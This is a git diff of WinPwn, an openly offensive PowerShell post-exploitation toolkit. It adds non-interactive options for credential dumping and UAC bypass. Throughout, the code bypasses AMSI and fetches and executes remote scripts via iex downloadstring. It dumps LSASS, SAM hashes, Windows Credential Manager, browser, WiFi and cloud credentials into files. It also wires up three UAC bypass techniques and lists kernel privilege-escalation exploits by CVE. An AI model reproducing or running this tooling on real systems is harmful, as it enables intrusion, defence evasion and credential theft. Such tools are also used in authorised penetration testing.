@@ -106,7 +106,7 @@ function sharpcradle{
         $argument2,
         [string]
         $argument3,
-        [string]
+        [switch]
         $noninteractive
     )
     pathcheck
@@ -359,9 +359,75 @@ function kittielocal
         Author: @S3cur3Th1sSh1t
         License: BSD 3-Clause
     #>
+    param(
+        [switch]
+        $noninteractive,
+        [switch]
+        $credentialmanager,
+        [switch]
+        $mimikittie,
+        [switch]
+        $rundll32lsass,
+        [switch]
+        $lazagne,
+        [switch]
+        $browsercredentials,
+        [switch]
+        $mimikittenz,
+        [switch]
+        $wificredentials,
+        [switch]
+        $samdump,
+        [switch]
+        $sharpcloud
+    )
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     AmsiBypass
+    if ($noninteractive)
+    {
+        if ($credentialmanager)
+        {
+            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
+            Write-Host "Dumping now, output goes to .\Exploitation\WCMCredentials.txt"
+            Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
+        }
+        if($mimikittie)
+        {
+            if (isadmin){obfuskittiedump}
+        }
+        if($rundll32lsass)
+        {
+            if(isadmin){dumplsass}
+        }
+        if($lazagne)
+        {
+            lazagnemodule
+        }
+        if($browsercredentials)
+        {
+            Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'
+            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
+            Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt
+        }
+        if($mimikittenz)
+        {
+            kittenz
+        }
+        if($wificredentials)
+        {
+            if(isadmin){wificreds}
+        }
+        if ($samdump)
+        {
+            if(isadmin){samfile}
+        }
+        if ($sharpcloud)
+        {
+            SharpCloud
+        } 
+        return
+    }
       
         do
         {
@@ -383,9 +449,9 @@ __        ___       ____
             Write-Host -ForegroundColor Green '6. Dump Browser credentials using Sharpweb! (no Admin need)'
             Write-Host -ForegroundColor Green '7. Run mimi-kittenz for extracting juicy info from memory! (no Admin need)'
             Write-Host -ForegroundColor Green '8. Get some Wifi Credentials! (Admin session only)'
-	    Write-Host -ForegroundColor Green '9. Dump SAM-File for NTLM Hashes! (Admin session only)'
-	    Write-Host -ForegroundColor Green '10. Check for the existence of credential files related to AWS, Microsoft Azure, and Google Compute!'	    
-	    Write-Host -ForegroundColor Green '11. Exit. '
+	        Write-Host -ForegroundColor Green '9. Dump SAM-File for NTLM Hashes! (Admin session only)'
+	        Write-Host -ForegroundColor Green '10. Check for the existence of credential files related to AWS, Microsoft Azure, and Google Compute!'	    
+	        Write-Host -ForegroundColor Green '11. Exit. '
             Write-Host "================ WinPwn ================"
             $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
             
@@ -396,7 +462,7 @@ __        ___       ____
                 3{if(isadmin){safedump}}
                 4{if(isadmin){dumplsass}}
                 5{lazagnemodule}
-                6{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\';iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1'); Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt}
+                6{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\';iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1'); Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt}
 		        7{kittenz}
 		        8{if(isadmin){wificreds}}
 		        9{if(isadmin){samfile}}
@@ -413,7 +479,7 @@ function SharpCloud
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpCloud.ps1')
     Invoke-SharpCloud -Command all >> $currentPath\Exploitation\CloudCreds.txt
     Get-Content $currentPath\Exploitation\CloudCreds.txt
-    pause;
+    Start-Sleep 5
 }
 
 function safedump
@@ -432,7 +498,7 @@ function obfuskittiedump
     Write-Host -ForegroundColor Yellow "Dumping Credentials output goes to .\Exploitation\Credentials.txt"
     Invoke-Mimikatz >> $currentPath\Exploitation\Credentials.txt
     Get-Content $currentPath\Exploitation\Credentials.txt
-    pause;
+    Start-Sleep -Seconds 5
 }
 function wificreds
 {
@@ -442,7 +508,7 @@ function wificreds
     Write-Host "Saving to .\Exploitation\WIFI_Keys.txt"
     Get-WLAN-Keys >> $currentPath\Exploitation\WIFI_Keys.txt
     Get-Content $currentPath\Exploitation\WIFI_Keys.txt
-    pause;
+    Start-Sleep -Seconds 5
 }
     
 function kittenz
@@ -453,7 +519,7 @@ function kittenz
     Write-Host -ForegroundColor Yellow 'Running the small kittie, output to .\Exploitation\kittenz.txt'
     inbox | out-string -Width 5000 >> $currentPath\Exploitation\kittenz.txt
     Get-Content $currentPath\Exploitation\kittenz.txt
-    pause;
+    Start-Sleep -Seconds 5
 }
     
 function samfile
@@ -464,7 +530,7 @@ function samfile
     Write-Host "Dumping SAM, output to .\Exploitation\SAMDump.txt"
     Invoke-PowerDump >> $currentPath\Exploitation\SAMDump.txt
     Get-Content $currentPath\Exploitation\SAMDump.txt
-    pause;
+    Start-Sleep -Seconds 5
 }
 
 function dumplsass
@@ -524,15 +590,15 @@ __        ___       ____
     do
     {
         Write-Host "================ WinPwn ================"
- 	Write-Host -ForegroundColor Green '1. MS15-077 - (XP/Vista/Win7/Win8/2000/2003/2008/2012) x86 only!'
- 	Write-Host -ForegroundColor Green '2. MS16-032 - (2008/7/8/10/2012)!'
+ 	    Write-Host -ForegroundColor Green '1. MS15-077 - (XP/Vista/Win7/Win8/2000/2003/2008/2012) x86 only!'
+ 	    Write-Host -ForegroundColor Green '2. MS16-032 - (2008/7/8/10/2012)!'
         Write-Host -ForegroundColor Green '3. MS16-135 - (WS2k16 only)! '
         Write-Host -ForegroundColor Green '4. CVE-2018-8120 - May 2018, Windows 7 SP1/2008 SP2,2008 R2 SP1! '
         Write-Host -ForegroundColor Green '5. CVE-2019-0841 - April 2019!'
         Write-Host -ForegroundColor Green '6. CVE-2019-1069 - Polarbear Hardlink, Credentials needed - June 2019! '
         Write-Host -ForegroundColor Green '7. CVE-2019-1129/1130 - Race Condition, multiples cores needed - July 2019! '
-	Write-Host -ForegroundColor Green '8. CVE-2019-1215 - September 2019 - x64 only! '
-	Write-Host -ForegroundColor Green '9. CVE-2020-0683 - February 2020 - x64 only! '
+	    Write-Host -ForegroundColor Green '8. CVE-2019-1215 - September 2019 - x64 only! '
+	    Write-Host -ForegroundColor Green '9. CVE-2020-0683 - February 2020 - x64 only! '
         Write-Host -ForegroundColor Green '10. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
         Write-Host -ForegroundColor Green '11. Exit. '
         Write-Host "================ WinPwn ================"
@@ -540,16 +606,16 @@ __        ___       ____
 
         Switch ($masterquestion) 
         {
-	     1{ms15-077}
-             2{ms16-32}
-             3{ms16-135}
-             4{CVE-2018-8120}
-             5{CVE-2019-0841}
-             6{cve-2019-1069}
-             7{CVE-2019-1129}
-	     8{CVE-2019-1215}
-	     9{CVE-2020-0683}
-             10{juicypot}
+	        1{ms15-077}
+            2{ms16-32}
+            3{ms16-135}
+            4{CVE-2018-8120}
+            5{CVE-2019-0841}
+            6{cve-2019-1069}
+            7{CVE-2019-1129}
+	        8{CVE-2019-1215}
+	        9{CVE-2020-0683}
+            10{juicypot}
        }
     }
  While ($masterquestion -ne 11)
@@ -1124,6 +1190,16 @@ __        ___       ____
 
 function UACBypass
 {
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive,
+        [string]
+        $command,
+        [string]
+        $technique   
+    )
+
     pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     @'
@@ -1138,6 +1214,25 @@ __        ___       ____
    --> UAC Bypass
 
 '@
+    if($noninteractive)
+    {
+        if ($technique -eq "ccmstp")
+        {
+            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/uaccmstp.ps1')
+            uaccmstp -BinFile $command
+        }
+        elseif($technique -eq "magic")
+        {
+            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/uacmagic.ps1')
+            uacmagic -BinPath $command
+        }
+        elseif ($technique -eq "DiskCleanup")
+        {
+            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/diskcleanupuac.ps1')
+            DiskCleanupBypass -command $command
+        }
+        return
+    }
     
     do
     {
@@ -2556,8 +2651,33 @@ function WinPwn
         [Switch]
         $Privesc,
         [Switch]
-        $PowerSharpPack   
+        $PowerSharpPack,
+        [Switch]
+        $Uacbypass,
+        [string]
+        $command,
+        [string]
+        $technique,
+        [switch]
+        $credentialmanager,
+        [switch]
+        $mimikittie,
+        [switch]
+        $rundll32lsass,
+        [switch]
+        $lazagne,
+        [switch]
+        $browsercredentials,
+        [switch]
+        $mimikittenz,
+        [switch]
+        $wificredentials,
+        [switch]
+        $samdump,
+        [switch]
+        $sharpcloud   
     )
+   
 @'
 
              
@@ -2590,7 +2710,51 @@ __        ___       ____
         {
             sharpcradle -allthosedotnet -noninteractive
         }
-        
+        if ($Uacbypass)
+        {
+            if ("ccmstp", "DiskCleanup", "magic" -notcontains $technique)
+            {
+                Write-Host "Invalid technique, choose from ccmstp DiskCleanup or magic"
+                return
+            }
+            UACBypass -noninteractive -command $command -technique $technique
+        }
+        if ($credentialmanager)
+        {
+            kittielocal -noninteractive -credentialmanager
+        }
+        if($mimikittie)
+        {
+            kittielocal -noninteractive -mimikittie
+        }
+        if($rundll32lsass)
+        {
+            kittielocal -noninteractive -rundll32lsass
+        }
+        if($lazagne)
+        {
+            kittielocal -noninteractive -lazagne
+        }
+        if($browsercredentials)
+        {
+            kittielocal -noninteractive -browsercredentials
+        }
+        if($mimikittenz)
+        {
+            kittielocal -noninteractive -mimikittenz
+        }
+        if($wificredentials)
+        {
+            kittielocal -noninteractive -wificredentials
+        }
+        if ($samdump)
+        {
+            kittielocal -noninteractive -samdump
+        }
+        if ($sharpcloud)
+        {
+            kittielocal -noninteractive -sharpcloud
+        } 
         return;
     }
 
